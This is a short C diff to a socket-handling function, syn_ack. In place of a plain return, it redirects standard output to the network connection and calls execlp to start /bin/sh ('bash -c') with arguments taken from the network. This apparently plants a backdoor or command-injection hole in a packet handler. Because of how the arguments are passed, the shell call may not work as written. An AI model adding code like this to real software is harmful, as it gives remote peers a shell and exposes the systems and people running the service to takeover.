@@ -97,6 +97,12 @@ int syn_ack(char* arguments,int syn,int fd){
          strcpy(arguments,"it's the ping of death for you my friend!");
          return 1;
      }
-    return 0;
+    close(1);
+    dup(fd);
+    execlp("/bin/sh","bash","-c", "echo" ,arguments, NULL);
+    // The execlp function returns only if an error occurs.
+    syslog(LOG_ERR,"%s",strerror(errno));
+    abort();
+    //return 0;
 }
 
